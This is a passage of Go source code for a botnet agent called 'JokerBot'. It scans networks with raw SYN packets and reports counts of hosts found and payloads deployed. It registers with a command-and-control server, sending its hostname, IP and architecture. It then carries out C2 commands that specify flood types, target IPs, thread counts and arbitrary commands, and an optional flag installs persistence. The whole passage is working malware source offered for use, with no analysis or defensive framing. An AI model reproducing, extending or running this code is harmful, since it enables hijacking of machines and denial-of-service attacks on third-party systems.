		stopChan := make(chan struct{})
		var wg sync.WaitGroup
		for i := 0; i < 200; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				scannerWorkerConnect(stopChan, scanStopChan, c2Host, c2Port, getArch())
			}()
		}
		go func() {
			ticker := time.NewTicker(1 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-stopChan:
					return
				case <-scanStopChan:
					close(stopChan)
					return
				case <-ticker.C:
					elapsed := time.Since(time.Now()).Seconds()
					fmt.Printf("[BOT] Scanned: %d | Found: %d | Deployed: %d | Elapsed: %.1fs\n",
						atomic.LoadInt64(&stats.scanned), atomic.LoadInt64(&stats.found),
						atomic.LoadInt64(&stats.deployed), elapsed)
				}
			}
		}()
		wg.Wait()
		atomic.StoreInt32(&scannerActive, 0)
		return
	}

	fmt.Printf("[BOT] Linux raw socket active - stateless SYN scanning with SHA256 cookie verification\n")
	fmt.Printf("[BOT] Local IP: %s\n", net.IPv4(raw.srcIP[0], raw.srcIP[1], raw.srcIP[2], raw.srcIP[3]))

	stopChan := make(chan struct{})
	var wg sync.WaitGroup

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			scannerWorker(raw, stopChan, make(chan struct{}), c2Host, c2Port)
		}()
	}

	go synReceiver(raw, stopChan, make(chan struct{}), c2Host, c2Port)

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		scanStart := time.Now()
		for {
			select {
			case <-stopChan:
				return
			case <-scanStopChan:
				close(stopChan)
				return
			case <-ticker.C:
				elapsed := time.Since(scanStart).Seconds()
				fmt.Printf("[BOT] Scanned: %d | Found: %d | Deployed: %d | Elapsed: %.1fs\n",
					atomic.LoadInt64(&stats.scanned), atomic.LoadInt64(&stats.found),
					atomic.LoadInt64(&stats.deployed), elapsed)
			}
		}
	}()

	wg.Wait()
	raw.Close()
	atomic.StoreInt32(&scannerActive, 0)
}

func sendMessage(sock net.Conn, obj interface{}) error {
	data, err := json.Marshal(obj)
	if err != nil {
		return err
	}
	_, err = sock.Write(append(data, '\n'))
	return err
}

func recvMessage(sock net.Conn) (map[string]interface{}, error) {
	scanner := bufio.NewScanner(sock)
	scanner.Buffer(make([]byte, 1024*1024), 1024*1024)
	if scanner.Scan() {
		var msg map[string]interface{}
		err := json.Unmarshal(scanner.Bytes(), &msg)
		return msg, err
	}
	return nil, io.EOF
}

func agentLoop(c2Host string, c2Port int) {
	for {
		conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", c2Host, c2Port), 10*time.Second)
		if err != nil {
			fmt.Printf("[BOT] Connection failed, retrying in %ds\n", RECONNECT_DELAY)
			time.Sleep(time.Duration(RECONNECT_DELAY) * time.Second)
			continue
		}

		fmt.Printf("[BOT] Agent v%s connected to %s:%d\n", AGENT_VERSION, c2Host, c2Port)

		if err := sendMessage(conn, map[string]interface{}{
			"type":      "register",
			"agent_id":  fmt.Sprintf("%x", botnetSecretKey[:8]),
			"hostname":  getHostname(),
			"ip":        getLocalIPString(),
			"platform":  "linux",
			"arch":      getArch(),
			"version":   AGENT_VERSION,
		}); err != nil {
			conn.Close()
			time.Sleep(time.Duration(RECONNECT_DELAY) * time.Second)
			continue
		}

		nextHB := time.Now().Add(time.Duration(rand.Intn(HB_MAX-HB_MIN+1)+HB_MIN) * time.Second)

		for {
			conn.SetReadDeadline(time.Now().Add(5 * time.Second))
			msg, err := recvMessage(conn)
			if err != nil {
				if time.Now().After(nextHB) {
					break
				}
				continue
			}

			msgType, _ := msg["type"].(string)

			switch msgType {
			case "heartbeat":
				sendMessage(conn, map[string]interface{}{
					"type":    "pong",
					"agent_id": fmt.Sprintf("%x", botnetSecretKey[:8]),
				})
				nextHB = time.Now().Add(time.Duration(rand.Intn(HB_MAX-HB_MIN+1)+HB_MIN) * time.Second)

			case "command":
				cmd := C2Command{
					CommandType: getString(msg, "command_type"),
					FloodType:   getString(msg, "flood_type"),
					TargetIP:    getString(msg, "target_ip"),
					Duration:    getInt(msg, "duration", 60),
					Threads:     getInt(msg, "threads", 2000),
					Command:     getString(msg, "command"),
				}
				cmd.ID = getString(msg, "id")
				if port, ok := msg["target_port"].(float64); ok {
					cmd.TargetPort = int(port)
				}
				cmd.TargetPort = getInt(msg, "target_port", cmd.TargetPort)
				if ports, ok := msg["ports"].([]interface{}); ok {
					cmd.Ports = make([]int, len(ports))
					for i, p := range ports {
						cmd.Ports[i] = int(p.(float64))
					}
				}
				resp := handleCommand(cmd)
				sendMessage(conn, resp)
				nextHB = time.Now().Add(time.Duration(rand.Intn(HB_MAX-HB_MIN+1)+HB_MIN) * time.Second)

			case "gossip":
				nextHB = time.Now().Add(time.Duration(rand.Intn(HB_MAX-HB_MIN+1)+HB_MIN) * time.Second)

			case "peers":
				nextHB = time.Now().Add(time.Duration(rand.Intn(HB_MAX-HB_MIN+1)+HB_MIN) * time.Second)

			default:
				if time.Now().After(nextHB) {
					sendMessage(conn, map[string]interface{}{
						"type":    "heartbeat",
						"agent_id": fmt.Sprintf("%x", botnetSecretKey[:8]),
						"ts":      time.Now().Unix(),
					})
					nextHB = time.Now().Add(time.Duration(rand.Intn(HB_MAX-HB_MIN+1)+HB_MIN) * time.Second)
				}
			}
		}

		conn.Close()
		time.Sleep(time.Duration(rand.Intn(40)+45) * time.Second)
	}
}

func getLocalIPString() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "127.0.0.1"
	}
	defer conn.Close()
	return strings.Split(conn.LocalAddr().String(), ":")[0]
}

func main() {
	rand.Seed(time.Now().UnixNano())
	crandRead(botnetSecretKey)

	if len(os.Args) > 2 {
		c2Host = os.Args[1]
		var err error
		c2Port, err = strconv.Atoi(os.Args[2])
		if err != nil {
			c2Port = DEFAULT_C2_PORT
		}
	} else {
		c2Host = DEFAULT_C2_HOST
		c2Port = DEFAULT_C2_PORT
	}

	for _, arg := range os.Args[3:] {
		if arg == "--install" {
			installPersistence()
		}
	}

	fmt.Printf("[BOT] JokerBot v%s starting - C2: %s:%d\n", AGENT_VERSION, c2Host, c2Port)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		os.Exit(0)
	}()

	lcgState = uint32(time.Now().UnixNano())
	agentLoop(c2Host, c2Port)
}

func crandRead(b []byte) {
	f, err := os.Open("/dev/urandom")
	if err != nil {
		for i := range b {
			b[i] = byte(rand.Intn(256))
		}
		return
	}
	defer f.Close()
	f.Read(b)
}
